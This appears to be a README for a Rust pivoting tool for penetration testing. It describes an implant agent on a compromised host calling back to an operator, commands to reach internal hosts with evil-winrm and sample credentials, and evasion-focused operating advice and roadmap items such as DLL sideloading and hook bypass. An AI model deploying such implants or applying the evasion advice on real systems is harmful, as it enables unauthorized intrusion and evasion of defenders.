# Imugi_ 🐉

> *In Korean folklore, the Imugi is a proto-dragon a serpent lurking unseen beneath rivers for a thousand years, waiting to ascend. It is patient, hidden, and inevitable.*

A cross-platform network tunneling and pivoting tool written in Rust, designed for penetration testing and red team operations. Imugi_ provides encrypted tunnel infrastructure between agents and operators, enabling seamless network pivoting through compromised hosts.

>  **Disclaimer:** Imugi_ is intended strictly for authorized penetration testing, red team engagements, and controlled lab environments (e.g. HackTheBox, TryHackMe, CRTE/CRTO labs). Do not use against systems you do not have explicit written permission to test. The author assumes no responsibility for misuse.

---

## Features

- 🔀 **Bidirectional tunneling** route traffic through a compromised pivot host transparently
- 🖥️ **Cross-platform** single codebase compiled natively for Linux and Windows
- 🦀 **Written in Rust** low overhead, no GC pauses, minimal runtime footprint
- 🔒 **Encrypted transport** traffic between agent and operator is encrypted in transit
- 🕵️ **Low signature profile** no dependency on common C2 frameworks or detectable runtimes
- ⚡ **Async I/O** built on Tokio for efficient concurrent connection handling
- 🌐 **TUN/TAP interface support** operator-side interface for full network-layer routing (Linux)
- 🪟 **WinDivert / raw socket support** Windows pivot agent traffic capture

---

## Architecture

```
[ Operator Machine ]                [ Pivot Host (Compromised) ]          [ Target Network ]
                                                                        
  imugi-proxy ◄──── encrypted ────► imugi-agent ◄───────────────────────► 10.10.10.0/24
  (TUN iface)        tunnel           (implant)       raw socket / TAP
  
  Routes all traffic destined for the target subnet through the pivot automatically.
```

**Components:**

| Binary        | Role                                                             | Platform        |
| ------------- | ---------------------------------------------------------------- | --------------- |
| `imugi-proxy` | Operator-side listener, creates TUN interface, handles routing   | Linux           |
| `imugi-agent` | Runs on the pivot host, connects back to proxy, forwards traffic | Linux / Windows |

---

## Installation

### Prebuilt Binaries

Download the latest release from the [Releases](#) page:

```
imugi-proxy       # Linux x86_64 operator binary
imugi-agent-linux # Linux x86_64 agent
imugi-agent.exe   # Windows x86_64 agent (cross-compiled)
```

### Build from Source

**Prerequisites:**

```bash
# Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Windows cross-compilation target
rustup target add x86_64-pc-windows-gnu

# Cross-compilation toolchain (Debian/Ubuntu)
sudo apt install mingw-w64
```

**Build:**

```bash
git clone https://github.com/k1aShiMa/Imugi_
cd Imugi_

# Linux binaries
cargo build --release --bin imugi-proxy
cargo build --release --bin imugi-agent

# Windows agent (cross-compiled from Linux)
cargo build --release --bin imugi-agent --target x86_64-pc-windows-gnu
```

Output binaries will be in `target/release/` and `target/x86_64-pc-windows-gnu/release/`.

---

## Usage

### 1. Start the proxy on your operator machine

```bash
sudo ./imugi-proxy --listen 0.0.0.0:9001 --tun imugi0
```

```
[*] Imugi_ proxy listening on 0.0.0.0:9001
[*] TUN interface 'imugi0' created
[*] Waiting for agent connection...
```

### 2. Transfer and run the agent on the pivot host

**Linux pivot:**
```bash
./imugi-agent --connect <YOUR_IP>:9001
```

**Windows pivot:**
```cmd
imugi-agent.exe --connect <YOUR_IP>:9001
```

### 3. Add a route on the operator machine

Once the agent connects, add a route through the TUN interface to reach the internal subnet:

```bash
# Example: target subnet is 172.16.0.0/24
sudo ip route add 172.16.0.0/24 dev imugi0
```

You can now reach internal hosts directly from your operator machine:

```bash
nmap -sV 172.16.0.10
evil-winrm -i 172.16.0.10 -u Administrator -p 'Password123'
```

---

## Options

### `imugi-proxy`

| Flag | Description | Default |
|---|---|---|
| `--listen` | Address and port to listen on | `0.0.0.0:9001` |
| `--tun` | TUN interface name to create | `imugi0` |
| `--secret` | Pre-shared key for auth | None |
| `--verbose` | Enable verbose logging | Off |

### `imugi-agent`

| Flag | Description | Default |
|---|---|---|
| `--connect` | Proxy address to connect back to | Required |
| `--secret` | Pre-shared key (must match proxy) | None |
| `--retry` | Reconnect on disconnect | Off |
| `--retry-delay` | Seconds between reconnect attempts | `5` |
| `--verbose` | Enable verbose logging | Off |

---

## Tested Environments

| Environment | Status |
|---|---|
| HTB Linux labs (pivot) | ✅ |
| HTB Windows labs (pivot) | ✅ |
| Parrot Linux (operator) | ✅ |
| Ubuntu 22.04 (operator) | ✅ |
| Windows 10/11 (agent) | ✅ |
| Windows Server 2019/2022 (agent) | ✅ |

---

## Roadmap

- [ ] In-memory agent execution (reflective loading)
- [ ] DLL sideloading delivery variant
- [ ] Compile-time string encryption
- [ ] Manual syscalls (bypass userland hooks)
- [ ] Mesh-based multi-hop tunneling
- [ ] HTTPS/WebSocket transport option
- [ ] Config file support
- [ ] Multiplexed sessions (multiple agents, single proxy)

---

## Comparison to ligolo-ng

Imugi_ draws heavy inspiration from [ligolo-ng](https://github.com/nicocha30/ligolo-ng). Key differences:

| | ligolo-ng | Imugi_ |
|---|---|---|
| Language | Go | Rust |
| Runtime | Go runtime (detectable) | No runtime |
| Binary size | Larger | Smaller |
| AV profile | Commonly signatured | Lower baseline detection |
| Mesh tunneling | Yes | Planned |
| Focus | Feature-complete | Stealth + evasion |

---

## OPSEC Notes

- Agent connects **outbound** no listening ports on the pivot host
- No hardcoded strings in release builds (planned: compile-time encryption)
- Binary does not write any artifacts to disk beyond itself
- Recommend running from a path that blends in (e.g. `C:\Windows\Temp\`, `/tmp/`)
- Use `--secret` in any real engagement to prevent unauthorized agent connections

---

## Author

**k1aShiMa** *tools signed with an underscore*

Part of the `Kitsune_` tool family:
- `Kitsune_` C2 framework
- `Imugi_` tunneling / pivoting

---

## License

For authorized security research and penetration testing use only.
